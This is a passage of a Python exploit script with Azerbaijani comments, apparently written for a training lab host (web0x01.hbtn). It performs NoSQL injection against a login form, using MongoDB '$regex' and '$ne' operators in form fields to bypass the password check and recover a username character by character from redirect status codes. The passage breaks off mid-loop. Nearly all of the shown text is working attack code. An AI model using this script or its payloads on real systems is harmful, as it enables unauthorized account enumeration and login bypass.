import requests
import string
import sys
import re

# Hədəf URL (Form endpoint-i ən etibarlısıdır)
url = "http://web0x01.hbtn/a3/nosql_injection"

def exploit_starting_with_e():
    # 1. ENUMERATION (Axtarış)
    # Sənin istəyinə uyğun olaraq "e" ilə başlayırıq
    found_username = "e"
    print(f"[*] Axtarış '{found_username}' hərfi ilə başlayır...")
    
    s = requests.Session()
    
    # Axtarılacaq simvollar (hərflər, rəqəmlər və bəzi simvollar)
    chars = string.ascii_letters + string.digits + ".-_"
    
    while True:
        found_new_char = False
        
        for char in chars:
            # Yoxlanacaq ad: ea, eb, ec...
            test_user = found_username + char
            
            # Payload: "Adı {test_user} ilə başlayan varmı?"
            payload = {
                "username[$regex]": f"^{test_user}",
                "password[$ne]": ""
            }
            
            try:
                # Redirect-i izləmirik (302/204 statusunu tutmaq üçün)
                r = s.post(url, data=payload, allow_redirects=False)
                
                # Əgər 302 (Found) və ya 204 (No Content) gəlsə, deməli hərf doğrudur
                if r.status_code in [302, 204]:
                    found_username += char
                    sys.stdout.write(f"\r[+] Tapıldı: {found_username}")
                    sys.stdout.flush()
                    found_new_char = True
                    break # Növbəti hərfə keç
            except requests.exceptions.RequestException:
                continue
        
        # Əgər dövr bitdi və yeni hərf
